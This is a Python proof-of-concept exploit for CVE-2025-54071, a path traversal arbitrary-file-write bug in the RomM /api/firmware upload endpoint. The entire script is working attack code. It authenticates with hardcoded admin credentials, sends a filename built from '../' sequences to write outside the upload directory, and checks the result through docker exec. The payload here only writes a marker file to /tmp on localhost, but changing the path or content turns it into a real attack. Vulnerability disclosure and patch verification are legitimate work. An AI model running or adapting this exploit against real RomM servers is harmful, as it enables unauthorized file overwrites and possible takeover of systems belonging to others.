#!/usr/bin/env python3
"""
CVE-2025-54071 - RomM Authenticated Arbitrary File Write Vulnerability
Affected versions: <= 4.0.0-beta.3
Fixed in: 4.0.0-beta.4

The vulnerability exists in multiple endpoints where filename is not sanitized:
- /api/saves (requires rom_id)
- /api/states (requires rom_id)  
- /api/firmware (requires platform_id only!) <-- Best attack vector
"""

import requests
import sys
import subprocess

TARGET = "http://localhost:8080"
USERNAME = "admin"
PASSWORD = "admin123"

def get_session():
    session = requests.Session()
    session.auth = (USERNAME, PASSWORD)
    return session

def get_or_create_platform(session):
    resp = session.get(f"{TARGET}/api/platforms")
    if resp.status_code == 200:
        platforms = resp.json()
        if platforms:
            return platforms[0]["id"]
    
    resp = session.post(
        f"{TARGET}/api/platforms",
        json={"fs_slug": "snes", "slug": "snes", "name": "SNES"}
    )
    if resp.status_code in [200, 201]:
        return resp.json().get("id", 1)
    return 1

def exploit_via_firmware(session, platform_id, target_path, content):
    """
    Exploit via /api/firmware endpoint - only needs valid platform_id!
    
    Vulnerable code in firmware_handler.py:
        file_location = os.path.join(path, file.filename)
        with open(file_location, "wb") as f:
            shutil.copyfileobj(file.file, f)
    """
    traversal_filename = f"../../../../..{target_path}"
    
    files = {
        'files': (traversal_filename, content.encode(), 'application/octet-stream')
    }
    
    resp = session.post(
        f"{TARGET}/api/firmware",
        params={"platform_id": platform_id},
        files=files
    )
    
    return resp

def verify_file(target_path):
    result = subprocess.run(
        ["docker", "exec", "romm", "cat", target_path],
        capture_output=True,
        text=True
    )
    return result.returncode == 0, result.stdout

def main():
    print("=" * 60)
    print("CVE-2025-54071 - RomM Arbitrary File Write PoC")
    print("Affected: RomM <= 4.0.0-beta.3")
    print("=" * 60)
    print()
    
    session = get_session()
    
    print("[*] Step 1: Authentication")
    resp = session.get(f"{TARGET}/api/users/me")
    if resp.status_code != 200:
        print("[-] Authentication failed!")
        return False
    user = resp.json()
    print(f"[+] Authenticated as: {user.get('username')} (role: {user.get('role')})")
    
    print()
    print("[*] Step 2: Get or create platform")
    platform_id = get_or_create_platform(session)
    print(f"[+] Using platform ID: {platform_id}")
    
    print()
    print("[*] Step 3: Exploit via /api/firmware endpoint")
    print("[!] This endpoint only requires platform_id, not rom_id!")
    
    poc_content = "CVE-2025-54071_POC_SUCCESS"
    target_file = "/tmp/cve_2025_54071_poc.txt"
    
    traversal = f"../../../../..{target_file}"
    print(f"[+] Target file: {target_file}")
    print(f"[+] Payload filename: {traversal}")
    print(f"[+] Content: {poc_content}")
    
    resp = exploit_via_firmware(session, platform_id, target_file, poc_content)
    
    print()
    print(f"[*] Response status: {resp.status_code}")
    print(f"[*] Response body: {resp.text[:300]}")
    
    if resp.status_code == 200:
        print()
        print("[+] Exploit request succeeded!")
        
        success, content = verify_file(target_file)
        if success and poc_content in content:
            print(f"[+] VULNERABLE! File written successfully!")
            print(f"[+] File content: {content.strip()}")
            print()
            print("=" * 60)
            print("EXPLOIT SUCCESSFUL - Arbitrary file write confirmed!")
            print("=" * 60)
            return True
        else:
            print(f"[!] File verification: success={success}")
            if content:
                print(f"[!] Content: {content}")
    else:
        print(f"[-] Exploit failed: {resp.status_code}")
        print(f"[-] Response: {resp.text}")
    
    return False

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
